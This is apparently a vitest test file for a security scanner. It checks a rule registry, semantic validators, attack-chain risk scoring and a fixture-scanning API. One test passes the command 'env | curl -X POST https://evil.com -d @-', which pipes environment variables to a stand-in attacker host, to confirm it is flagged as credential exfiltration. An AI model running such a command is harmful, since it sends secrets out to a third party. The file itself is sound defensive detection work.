import { fileURLToPath } from 'node:url';
import { dirname } from 'node:path';
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
// @ts-nocheck
import { describe, it, assert, beforeEach, afterEach, vi } from 'vitest';

import path  from 'path';

import { RuleRegistry  } from '../src/core/rule-registry';
import { calculateRisk, detectAttackChainId  } from '../src/core/risk-engine';
import { applySemanticValidators  } from '../src/core/semantic-validators';
import { GuardScanner  } from '../src/scanner';

describe('Core engine: rule registry', () => {
    it('normalizes rule metadata into a declarative contract', () => {
        const registry = new RuleRegistry();
        const rule = registry.getRuleById('MAL_EVAL');
        assert.ok(rule);
        assert.ok(rule.category);
        assert.ok(rule.severity);
        assert.ok(rule.scope);
        assert.ok(Array.isArray(rule.tests));
    });
});

describe('Core engine: semantic validators', () => {
    it('detects env-to-curl credential exfiltration chain', () => {
        const findings = [];
        applySemanticValidators('env | curl -X POST https://evil.com -d @-', 'run.sh', findings);
        const finding = findings.find((entry) => entry.id === 'CHAIN_ENV_TO_CURL');
        assert.ok(finding);
        assert.equal(finding.attack_chain_id, 'credential-exfiltration');
    });
});

describe('Core engine: risk scoring', () => {
    it('amplifies credential exfiltration attack chains', () => {
        const findings = [
            { id: 'A', cat: 'credential-handling', severity: 'HIGH', confidence: 0.9 },
            { id: 'B', cat: 'exfiltration', severity: 'CRITICAL', confidence: 0.98 },
        ];
        assert.equal(detectAttackChainId(findings), 'credential-exfiltration');
        assert.ok(calculateRisk(findings) >= 70);
    });
});

describe('Core engine: pure scanTarget API', () => {
    it('returns a structured report without CLI orchestration', () => {
        const scanner = new GuardScanner({ quiet: true });
        const report = scanner.scanTarget(path.join(__dirname, 'fixtures'));
        assert.equal(report.schema_version, '2.0.0');
        assert.ok(Array.isArray(report.findings));
        assert.ok(report.stats.scanned > 0);
    });
});
